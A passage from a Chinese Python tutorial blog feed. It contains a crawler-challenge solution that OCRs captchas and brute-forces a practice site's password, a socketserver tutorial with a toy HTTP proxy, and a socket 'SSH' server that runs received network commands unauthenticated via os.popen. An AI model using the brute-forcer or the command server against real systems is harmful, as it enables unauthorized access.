class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex04/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex04/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCaptcha_0</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    Captcha_0 = soup.find(<span class="string">'input'</span>,id=<span class="string">"id_captcha_0"</span>)[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> Captcha_0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(url=login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第五关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageURL</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    imageURL = <span class="string">'http://www.heibanke.com'</span>+soup.find(<span class="string">'img'</span>,class_=<span class="string">'captcha'</span>)[<span class="string">'src'</span>]</span><br><span class="line">    <span class="keyword">return</span> imageURL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageCode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------开始识别验证码'</span>)</span><br><span class="line">        pas = s.get(url=pass_url)</span><br><span class="line">        imageURL = getImageURL(pas.text)</span><br><span class="line">        image = s.get(url=imageURL)</span><br><span class="line">        captcha_img = Image.open(BytesIO(image.content))</span><br><span class="line">        imageCode = pytesseract.image_to_string(captcha_img)</span><br><span class="line">        print(<span class="string">'验证码识别结果:'</span>,imageCode)</span><br><span class="line">        print(<span class="string">'--------------------开始校验验证码'</span>)</span><br><span class="line">        match = re.search(<span class="string">r'^[A-Z | a-z]&#123;4&#125;$'</span>,imageCode)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验结果识别失败，继续识别'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验成功'</span>)</span><br><span class="line">            mess = (imageCode,pas)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------------------------开始猜测密码'</span>)</span><br><span class="line">        imageCode,pas = getImageCode()</span><br><span class="line">        pas_token = getToken(pas.text)</span><br><span class="line">        Captcha_0 = getCaptcha_0(pas.text)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'csrfmiddlewaretoken'</span>:pas_token,</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">            <span class="string">'password'</span>:password,</span><br><span class="line">            <span class="string">'captcha_0'</span>:Captcha_0,</span><br><span class="line">            <span class="string">'captcha_1'</span>:imageCode</span><br><span class="line">            &#125;</span><br><span class="line">        g = s.post(url=pass_url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码输入错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'验证码输入错误'</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'密码:'</span>,password,<span class="string">'错误'</span>)</span><br><span class="line">            password +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            print(<span class="string">'密码:'</span>,password,<span class="string">'正确'</span>)</span><br><span class="line">            print(<span class="string">'返回的页面结果:'</span>)</span><br><span class="line">            print(g.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">login()</span><br><span class="line">guess()</span><br></pre></td></tr></table></figure><p>这关坑还是很多的，主要是识别校验码的正确率有点低，即使校验结果是四个英文字母，也不一定是正确的验证码，而且密码是随着时间变化的，总之耐心尝试吧，有了思路多尝试最后总是能成功的</p><p>最后我的时间段检测到的正确密码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器提交密码19</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后附上参考的链接：<a href="https://www.jianshu.com/p/f64853b8f7e9" target="_blank" rel="noopener">https://www.jianshu.com/p/f64853b8f7e9</a></p>]]></content>
    
    <summary type="html">
    
      Python爬虫
    
    </summary>
    
      <category term="Python爬虫" scheme="https://Foxgrin.github.io/categories/Python%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python网络编程(二)</title>
    <link href="https://Foxgrin.github.io//posts/24856/"/>
    <id>https://Foxgrin.github.io//posts/24856/</id>
    <published>2018-07-24T14:39:00.000Z</published>
    <updated>2018-07-25T01:58:14.254Z</updated>
    
    <content type="html"><![CDATA[<p>在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部<a id="more"></a></p><h2 id="socketserver库"><a href="#socketserver库" class="headerlink" title="socketserver库"></a>socketserver库</h2><p>python 3是将python 2中的SocketServer库的大写取消，即socketserver库</p><p>首先介绍一下socketserver库的五个重要的类：</p><p>1.BaseServe：这个类是模块里最基本的类，所有的类源头都来至于这个基类，但是他不是用于实例或使用的</p><p>2.TCPServer：这个类用于TCP/ip的socket通讯</p><p>3.UDPServer：这个类用于UDP的socket通讯</p><p>4.UnixStreamServer </p><p>5.UnixDatagramServer :使用的Unix - domain sockets通讯，并且只能Unix平台使用</p><p>可能看不太懂，无所谓，我们只需要关心它的基本使用方法即可</p><p>(1)首先我们先导入socketserver库，这个就不用多说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br></pre></td></tr></table></figure><p>(2)然后我们需要自定义一个类，用这个类来继承socketserver库中的BaseRequestHandler类，然后重写BaseRequestHandler类中的handle方法，其实就是自定义我们通讯的接收与发送过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTCPServer</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">            self.data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            print(bytes.decode(self.data))</span><br><span class="line">            self.reply = input(<span class="string">'reply: '</span>)</span><br><span class="line">            self.request.sendall(str.encode(self.reply))</span><br></pre></td></tr></table></figure><p>这里的self.request.recv()和self.request.sendall()其实就相当于我们socket模块中的recv和send方法</p><p>(3)接下来我们在主函数中使用socketserver的ThreadingTCPServer方法实例化一个对象server，传入元组(ip,端口)和我们定义的继承类，然后使用serve_forever()来启动服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">''</span>,<span class="number">6666</span>),MyTCPServer)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>可以看出，对比与socket库，我们简化了初始socket，绑定端口ip，开始监听的过程，只需要去规定发送与接收信息的流程，并且支持多线程，短短几行代码就可以实现我们之前通过复杂的代码实现的效果</p><p>下面附上一个简单的Server端和Client端的实例：</p><p>Server端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTCPServer</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Connected By'</span>,self.client_address)</span><br><span class="line">        self.request.send(str.encode(<span class="string">'Welcome to TCPServer!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            self.data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            self.data = bytes.decode(self.data)</span><br><span class="line">            <span class="keyword">if</span>(self.data == <span class="string">'exit'</span>):</span><br><span class="line">                print(<span class="string">'Client'</span>,self.client_address,<span class="string">'has lost'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The data from'</span>,self.client_address,<span class="string">'is'</span>,self.data)</span><br><span class="line">            self.reply = input(<span class="string">'reply to client: '</span>)</span><br><span class="line">            self.request.send(str.encode(self.reply))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    HOST = <span class="string">'localhost'</span></span><br><span class="line">    PORT = <span class="number">6666</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((HOST,PORT),MyTCPServer)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>Client端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">message = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(message))</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = input(<span class="string">'data: '</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">'exit'</span>:</span><br><span class="line">        c.send(str.encode(data))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.send(str.encode(data))</span><br><span class="line">    reply = c.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'The reply from TCPServer is'</span>,bytes.decode(reply))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><h2 id="模拟burp抓取http包"><a href="#模拟burp抓取http包" class="headerlink" title="模拟burp抓取http包"></a>模拟burp抓取http包</h2><p>想必大家都用过burp，它相当于一个我们使用的客户端与要访问的服务器之间的一个代理，我们要发送到服务器的http请求报文都会通过burp，被burp拦截下来，然后burp可以分析我们发送的http请求包头</p><p>在学习了socket后，我们可以试着模拟一下代理的过程，首先我们先试着抓取http请求</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">8080</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">sock,addr = s.accept()</span><br><span class="line">header = bytes.decode(sock.recv(<span class="number">1024</span>))</span><br><span class="line">print(header)</span><br><span class="line">sock.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>代码很简单，就是利用socket库的基本方法，这里监听的是本地的8080端口，也就是说我们设置浏览器的代理地址是127.0.0.1，端口是8080</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python网络编程/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来启动程序，在浏览器中输入网址，监听到http包头</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python网络编程/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后我们要想办法获取访问的主机名，这里利用正则匹配获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r'Host:\s(.*)\s'</span>,http)</span><br><span class="line">CHOST = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>获取了访问的主机名，我们就可以连接至访问主机，然后将http包头发送给目标主机，再将目标主机返回的信息发回给本地主机，就可以实现代理了，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHost</span><span class="params">(http)</span>:</span></span><br><span class="line">    match = re.search(<span class="string">r'Host:\s(.*)\s'</span>,http)</span><br><span class="line">    CHOST = match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> CHOST</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.http = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        self.http = bytes.decode(self.http)</span><br><span class="line">        print(self.http)</span><br><span class="line">        self.CHOST = getHost(self.http)</span><br><span class="line">        c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        c.connect((self.CHOST,<span class="number">80</span>))</span><br><span class="line">        c.send(str.encode(http))</span><br><span class="line">        response = []</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = c.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                response.append(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.response = <span class="string">''</span>.join(response)</span><br><span class="line">        self.sendall(self.response)                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    LHOST = <span class="string">'localhost'</span></span><br><span class="line">    LPORT = <span class="number">8080</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((LHOST,LPORT),MyProxy)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>这个程序实践过程中很明显的会出现很多不可预料的错误，要解决这些只能更详细的学习代理的协议，但是简单的思路还是没错的</p>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python网络编程(一)</title>
    <link href="https://Foxgrin.github.io//posts/41404/"/>
    <id>https://Foxgrin.github.io//posts/41404/</id>
    <published>2018-07-22T08:00:00.000Z</published>
    <updated>2018-07-23T03:56:44.075Z</updated>
    
    <content type="html"><![CDATA[<p>Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程<a id="more"></a></p><h2 id="Socket库基本用法"><a href="#Socket库基本用法" class="headerlink" title="Socket库基本用法"></a>Socket库基本用法</h2><p>Socket是任何一种计算机网络通讯最基础的内容，例如当你在浏览器地址栏中输入一个网址时，你就会打开一个套接字，任何连接到指定的网址并读取响应的页面然后显示出来，在Python中使用Socket库进行通信的对象无非就是两个，一个是服务器端，一个是客户端</p><p>服务器端的主要流程：</p><p>(1)初始化socket()，创建套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(AF_INET,SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>这里socket函数是初始化socket，里面的参数默认是AF_INET和SOCK_STREAM</p><p>(2)使用bind()绑定服务器端的ip和端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br></pre></td></tr></table></figure><p>这里注意传入的参数是一个元组，包含了ip地址和端口号</p><p>(3)使用listen()监听消息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.listen(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>这里的参数最大值为5</p><p>(4)使用accept()获取客户端的套接字地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock,addr = s.accept()</span><br></pre></td></tr></table></figure><p>这个函数有点类似input函数，input函数是等待用户输入才会执行下一步，而accept函数则等待用户的连接才执行下一步，返回也是一个元组(conn,address)，其中conn是新的套接字对象，可以用来接收和发送数据，address是连接的客户端地址</p><p>(5)使用recv()接收数据，send()发送数据与客户端进行交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = sock.recv(<span class="number">1024</span>)</span><br><span class="line">sock.send(data)</span><br></pre></td></tr></table></figure><p>这里要注意的是在Python 3中send()中的参数必须是字节类型</p><p>客户端的主要流程：</p><p>(1)初始化socket()，创建套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = socket.socket(AF_INET,SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>(2)使用connect()指定连接的ip和端口号连接至指定服务器端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br></pre></td></tr></table></figure><p>同样的，参数必须是元组，包括要连接的服务器的ip地址和端口号</p><p>(3)使用recv()接收数据，send()发送数据与服务器端进行交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text = c.recv(<span class="number">1024</span>)</span><br><span class="line">c.send(data)</span><br></pre></td></tr></table></figure><p>其实使用socket库其实就只需要注意send()与recv()需要对应起来，不然可能导致客户端或者服务器端处于挂起的状态</p><p>下面我们就来看一个简单的服务器端和客户端的一个例子</p><p>Server(服务器端)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=socket(AF_INET,SOCK_STREAM) <span class="comment">#初始化socket，创建套接字</span></span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>)) <span class="comment">#绑定服务器ip地址和端口</span></span><br><span class="line">s.listen(<span class="number">5</span>) <span class="comment">#开始监听</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr=s.accept() <span class="comment">#等待客户端连接，获取客户端套接字地址</span></span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to Server!'</span>)) <span class="comment">#向客户端发送数据</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>) <span class="comment">#接收客户端发送的数据</span></span><br><span class="line">        print(bytes.decode(data))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print(<span class="string">'Client has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Client(客户端)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=socket(AF_INET,SOCK_STREAM) <span class="comment">#初始化套接字</span></span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>)) <span class="comment">#连接服务器</span></span><br><span class="line">text=c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(text))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    data=input()</span><br><span class="line">    c.send(str.encode(data))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure><p>服务器端使用了死循环以保持一直处于监听状态，客户端发送10次信息与服务器端断开连接，之后服务器继续等待客户端连接，这个程序缺点是服务器端只能支持一个客户端连入，不能支持多个客户端同时连入</p><h2 id="os库基本用法"><a href="#os库基本用法" class="headerlink" title="os库基本用法"></a>os库基本用法</h2><p>Python的os库提供了各种操作系统功能的接口，通过例子简单说明一下几种常用的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">a = os.system(cmd) <span class="comment">#执行shell命令</span></span><br><span class="line">print(a) <span class="comment">#返回值为0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = input(<span class="string">'Please input a command: '</span>)</span><br><span class="line">a = os.popen(cmd) <span class="comment">#返回一个对象</span></span><br><span class="line">print(a.read())</span><br><span class="line"></span><br><span class="line">print(os.getcwd()) <span class="comment">#获取当前目录</span></span><br><span class="line">print(os.listdir(os.getcwd())) <span class="comment">#返回指定文件夹下包含的文件或文件夹的名字的列表</span></span><br><span class="line">os.chdir(os.getcwd()+<span class="string">'/test'</span>) <span class="comment">#到达指定目录下</span></span><br><span class="line">os.system(<span class="string">'test.py'</span>)</span><br></pre></td></tr></table></figure><p>下面通过os库与socket库结合模拟SSH通信</p><p>服务器端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'localhost'</span>,<span class="number">6666</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(<span class="string">'Connected By'</span>,addr)</span><br><span class="line">    sock.send(str.encode(<span class="string">'Welcome to the SSHServer!'</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        cmd = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        cmd = bytes.decode(cmd)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'exit'</span>:</span><br><span class="line">            print(<span class="string">'Client has lost'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result = os.popen(cmd).read()</span><br><span 